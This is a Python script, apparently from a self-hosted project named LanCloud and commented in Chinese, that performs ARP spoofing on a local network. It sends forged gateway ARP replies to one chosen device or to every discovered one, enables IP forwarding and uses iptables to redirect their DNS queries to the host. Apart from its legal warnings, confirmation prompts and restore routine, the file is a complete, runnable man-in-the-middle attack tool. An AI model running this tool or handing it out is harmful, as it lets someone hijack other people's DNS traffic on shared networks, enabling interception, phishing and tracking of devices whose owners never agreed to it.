#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LanCloud ARP DNS 劫持助手（方案 C · Linux 实验脚本）

用途：在【你自己拥有 / 已获授权】的局域网内，让其他设备【零配置】地把
DNS 查询自动送到本机 LanCloud DNS —— 无需在每台设备上设置 DNS，
设备只要连上同一个 WiFi / 网线即可被自动接管。

原理（单向 ARP 欺骗）：
  1. 周期性向目标设备发送伪造 ARP 应答：告诉它"网关的 MAC 是本机"；
  2. 目标设备的出站流量（含 DNS 查询）先到达本机；
  3. iptables 把 53 端口（UDP+TCP）REDIRECT 到本机 LanCloud DNS；
  4. 其余流量由内核 IP 转发给真实网关 —— 不影响正常上网；
  5. 命中域名映射 → 返回你的 IP；未命中 → LanCloud 自动转发上游。

用法（必须 root）：
  sudo python3 scripts/arp_hijack.py --check             # 环境体检
  sudo python3 scripts/arp_hijack.py                     # 交互选择目标
  sudo python3 scripts/arp_hijack.py --all               # 接管全网设备（自动排除网关与本机）
  sudo python3 scripts/arp_hijack.py --target 192.168.1.50
  sudo python3 scripts/arp_hijack.py --restore           # 立即恢复网络
  sudo python3 scripts/arp_hijack.py --all --dry-run     # 只打印要执行的命令

依赖：scapy（pip3 install scapy）、iptables、ip（iproute2）。
提示：运行前请先启动 LanCloud DNS（管理面板 → DNS 服务，端口默认 53；
      若用高端口如 8053，加 --dns-port 8053）。

法律边界（必读）：ARP 欺骗属于网络中间人技术，只允许在你自己拥有或已获
明确授权的网络和设备上使用。在中国，未经授权截获/劫持他人网络流量违反
《网络安全法》和《刑法》第 285/286 条，用于钓鱼盗号属于犯罪。
"""
import argparse
import os
import re
import shutil
import socket
import subprocess
import sys
import time

WARN = """
\033[31m
═══════════════════════════════════════════════════════════════
  ⚠  法律与道德警告（请逐字阅读）
  本工具使用 ARP 欺骗中间人技术接管局域网内设备的 DNS 查询。
  · 只允许在【你自己拥有或已获明确授权】的网络和设备上使用
  · 未经授权劫持他人流量违反《网络安全法》《刑法》第 285/286 条
  · 用于钓鱼、盗号、窃取信息属于犯罪行为，与本项目无关
  · 本工具不提供任何内容注入/伪造页面的能力，仅接管 DNS 解析
═══════════════════════════════════════════════════════════════
\033[0m"""


def sh(cmd, **kw):
    """执行 shell 命令，返回 (rc, stdout)"""
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, **kw)
    return p.returncode, (p.stdout or "").strip()


def need_root():
    if os.geteuid() != 0:
        sys.exit("需要 root 权限：请用 sudo 运行（ARP 欺骗与 iptables 都需要）")


def need_tool(tool):
    if shutil.which(tool) is None:
        sys.exit(f"缺少系统工具 {tool}，请先安装（如 sudo apt install {tool}）")


# ---------- 网络信息 ----------

def get_gateway_iface():
    """返回 (网关IP, 网卡名)。优先 ip route，失败回退 scapy 路由表。"""
    rc, out = sh("ip route 2>/dev/null | awk '/^default/{print $3, $5; exit}'")
    if rc == 0 and out:
        parts = out.split()
        if len(parts) >= 2:
            return parts[0], parts[1]
    try:
        from scapy.all import conf
        gw, iface = conf.route.route("0.0.0.0")
        return gw, iface
    except Exception:
        pass
    sys.exit("无法识别默认网关与网卡（请检查网络连接）")


def get_my_ip(iface):
    rc, out = sh(f"ip -4 addr show {iface} 2>/dev/null | awk '/inet /{{print $2; exit}}'")
    if rc == 0 and out:
        return out.split("/")[0]
    sys.exit(f"无法获取网卡 {iface} 的 IP")


def get_my_mac(iface):
    rc, out = sh(f"ip link show {iface} 2>/dev/null | awk '/link\\/ether/{{print $2; exit}}'")
    if rc == 0 and out:
        return out
    sys.exit(f"无法获取网卡 {iface} 的 MAC")


def get_gateway_mac(gw_ip, iface):
    """通过 ARP 请求获取网关真实 MAC"""
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
                     timeout=2, iface=iface, verbose=0)
        if ans:
            return ans[0][1].hwsrc
        return None
    except Exception:
        return None


def discover_targets(iface, my_ip, gw_ip, cidr=None):
    """枚举局域网内其他设备：优先读 ARP 表，--cidr 时做 ARP 扫描"""
    from scapy.all import ARP, Ether, srp
    targets = {}  # ip -> mac
    # 1) 现有 ARP 表
    for line in sh("ip neigh 2>/dev/null | grep -v FAILED")[1].splitlines():
        parts = line.split()
        if len(parts) >= 4 and parts[1] == "lladdr":
            ip, mac = parts[0], parts[2]
            if ip != my_ip and ip != gw_ip:
                targets[ip] = mac
    # 2) ARP 扫描（指定 cidr 或网段可发现）
    if cidr:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
                     timeout=3, iface=iface, verbose=0)
        for _, r in ans:
            if r.psrc != my_ip and r.psrc != gw_ip:
                targets[r.psrc] = r.hwsrc
    return targets


# ---------- iptables ----------

def ipt_rules(iface, dns_port):
    """要添加的 iptables 规则列表（可记录用于恢复）"""
    return [
        f"iptables -t nat -A PREROUTING -i {iface} -p udp --dport 53 "
        f"-j REDIRECT --to-ports {dns_port} -m comment --comment lancloud-arp",
        f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 53 "
        f"-j REDIRECT --to-ports {dns_port} -m comment --comment lancloud-arp",
    ]


def apply_iptables(iface, dns_port, dry=False):
    rules = ipt_rules(iface, dns_port)
    for r in rules:
        if dry:
            print("  [dry-run] " + r)
        else:
            rc, out = sh(r)
            if rc != 0 and "already" not in out:
                print(f"  [iptables] 警告: {out or r}")
    if not dry:
        print(f"  [iptables] 已把 53 端口(UDP+TCP) 重定向到本机 DNS :{dns_port}")


def clear_iptables(iface, dry=False):
    for proto in ("udp", "tcp"):
        cmd = (f"iptables -t nat -D PREROUTING -i {iface} -p {proto} --dport 53 "
               f"-j REDIRECT -m comment --comment lancloud-arp")
        if dry:
            print("  [dry-run] " + cmd)
        else:
            sh(cmd)
    if not dry:
        print("  [iptables] 已清除 DNS 重定向规则")


# ---------- ARP 欺骗 ----------

def spoof(targets, gw_ip, gw_mac, my_mac, iface, interval=2.0, stop=None, dry=False):
    """周期性向目标发送伪造 ARP 应答（告诉目标：网关的 MAC 是本机）"""
    from scapy.all import ARP, Ether, sendp
    if dry:
        print(f"  [dry-run] 每 {interval}s 广播 ARP: 网关 {gw_ip} 的 MAC = {my_mac}（共 {len(targets)} 台设备）")
        return
    sent = 0
    while not (stop and stop.is_set()):
        for ip in targets:
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gw_ip, pdst=ip,
                                                       hwsrc=my_mac),
                  iface=iface, verbose=0)
        sent += 1
        if sent == 1:
            print(f"  [ARP] 已开始欺骗 {len(targets)} 台设备（网关 {gw_ip} → 本机 {my_mac}），每 {interval}s 重播…")
        time.sleep(interval)


def restore(targets, gw_ip, gw_mac, iface, dry=False):
    """广播真实网关 MAC，让设备恢复正确映射"""
    from scapy.all import ARP, Ether, sendp
    if dry:
        print(f"  [dry-run] 广播真实 ARP: 网关 {gw_ip} 的 MAC = {gw_mac}")
        return
    for _ in range(3):
        for ip in targets:
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gw_ip, pdst=ip,
                                                       hwsrc=gw_mac),
                  iface=iface, verbose=0)
    print(f"  [ARP] 已广播真实网关 MAC，设备将恢复直连网关（30 秒内自动纠正）")


# ---------- 检查 ----------

def check_dns(dns_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(1.5)
    try:
        # 发一个假 DNS 查询探测（pan.lan A 记录）
        import struct
        tid = 0x1234
        q = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0) + b"\x07pan\x03lan\x00\x00\x01\x00\x01"
        s.sendto(q, ("127.0.0.1", dns_port))
        s.recvfrom(512)
        return True
    except Exception:
        return False
    finally:
        s.close()


def run_check(dns_port):
    print("== LanCloud ARP 劫持助手 · 环境体检 ==")
    need_tool("iptables")
    need_tool("ip")
    try:
        import scapy  # noqa
        print("  [OK]   scapy 已安装")
    except ImportError:
        sys.exit("  [缺少] scapy 未安装，请执行: pip3 install scapy")
    gw, iface = get_gateway_iface()
    my_ip = get_my_ip(iface)
    my_mac = get_my_mac(iface)
    gw_mac = get_gateway_mac(gw, iface)
    print(f"  [OK]   网卡 {iface}  本机 {my_ip} / {my_mac}")
    print(f"  [OK]   网关 {gw}" + (f" / {gw_mac}" if gw_mac else "（MAC 未知）"))
    if gw_mac == my_mac:
        sys.exit("  [错误] 网关 MAC 与本机相同？本机似乎就是网关，无需 ARP 欺骗")
    print("  [OK]   DNS 探测 :%d →" % dns_port, "响应正常" if check_dns(dns_port)
          else "\033[33m无响应！请先启动 LanCloud DNS（管理面板 → DNS 服务）\033[0m")
    targets = discover_targets(iface, my_ip, gw)
    print(f"  [OK]   当前发现 {len(targets)} 台局域网设备" +
          ("：" + "、".join(targets) if targets else "（--cidr 可主动扫描）"))


# ---------- 主流程 ----------

def main():
    ap = argparse.ArgumentParser(description="LanCloud ARP DNS 劫持助手（仅限自有/已授权网络）")
    ap.add_argument("--check", action="store_true", help="环境体检")
    ap.add_argument("--all", action="store_true", help="接管全部发现设备")
    ap.add_argument("--target", help="只接管指定 IP（可逗号分隔多个）")
    ap.add_argument("--cidr", help="主动 ARP 扫描该网段，如 192.168.1.0/24")
    ap.add_argument("--dns-port", type=int, default=53, help="本机 LanCloud DNS 端口（默认 53）")
    ap.add_argument("--interval", type=float, default=2.0, help="ARP 重播间隔秒（默认 2）")
    ap.add_argument("--yes", action="store_true", help="跳过确认（已阅读并同意法律警告）")
    ap.add_argument("--dry-run", action="store_true", help="只打印要执行的命令，不实际操作")
    ap.add_argument("--restore", action="store_true", help="恢复网络（清 iptables + 广播真实网关 ARP）")
    args = ap.parse_args()

    need_root()
    if args.check:
        run_check(args.dns_port)
        return

    if args.restore:
        gw, iface = get_gateway_iface()
        gw_mac = get_gateway_mac(gw, iface) or ("00:00:00:00:00:00" if args.dry_run else "")
        targets = discover_targets(iface, get_my_ip(iface), gw)
        clear_iptables(iface, args.dry_run)
        if gw_mac:
            restore(targets, gw, gw_mac, iface, args.dry_run)
        else:
            print("  [警告] 无法获取网关 MAC，请重启相关设备以恢复 ARP 缓存")
        if not args.dry_run:
            rc, out = sh("sysctl net.ipv4.ip_forward")
            if rc == 0 and " = 1" in out:
                sh("sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
                print("  [恢复] 已关闭 IP 转发（恢复原状）")
        print("恢复完成。")
        return

    print(WARN)
    if not args.yes and not args.dry_run:
        ans = input("本机是否属于【自有 / 已授权】网络？确认继续请输 yes：").strip().lower()
        if ans != "yes":
            sys.exit("已取消。")

    gw, iface = get_gateway_iface()
    my_ip = get_my_ip(iface)
    my_mac = get_my_mac(iface)
    gw_mac = get_gateway_mac(gw, iface)
    if not gw_mac:
        if args.dry_run:
            gw_mac = "00:00:00:00:00:00"  # dry-run 仅演示命令流
        else:
            sys.exit("无法获取网关真实 MAC（用于恢复），请检查网络后重试")

    # 目标集合
    targets = {}
    if args.target:
        for ip in args.target.split(","):
            targets[ip] = None
    else:
        targets = discover_targets(iface, my_ip, gw, args.cidr)
    if not targets:
        if args.dry_run:
            targets = {"192.168.1.50": None}  # dry-run 演示占位
        else:
            sys.exit("没有发现目标设备（可用 --cidr 192.168.x.0/24 主动扫描，或 --target 指定）")
    if my_ip in targets:
        del targets[my_ip]
    if gw in targets:
        del targets[gw]

    print(f"\n[目标] 网卡 {iface}  网关 {gw}({gw_mac})  本机 {my_ip}({my_mac})")
    print(f"[目标] 将接管 {len(targets)} 台设备：{'、'.join(targets)}")
    if not args.yes and not args.dry_run:
        ans = input("确认接管以上设备？yes/no：").strip().lower()
        if ans != "yes":
            sys.exit("已取消。")

    # 开启 IP 转发（其余流量可正常上网）
    if not args.dry_run:
        sh("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
        print("[转发] 已开启内核 IP 转发（保证非 DNS 流量正常上网）")

    # iptables 接管 53
    apply_iptables(iface, args.dns_port, args.dry_run)

    # ARP 欺骗主循环（Ctrl+C 自动恢复）
    import threading
    stop = threading.Event()
    try:
        spoof(list(targets), gw, gw_mac, my_mac, iface, args.interval, stop, args.dry_run)
    except KeyboardInterrupt:
        print("\n收到中断，正在恢复网络…")
    finally:
        stop.set()
        clear_iptables(iface, args.dry_run)
        restore(list(targets), gw, gw_mac, iface, args.dry_run)
        if not args.dry_run:
            sh("sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
        print("已恢复：iptables 规则已清除，ARP 映射已还原。")

    print("\n提示：被接管设备的 DNS 查询现由 LanCloud 处理；")
    print("      在管理面板『劫持向导 → 查询日志』可看到它们的查询记录。")


if __name__ == "__main__":
    main()
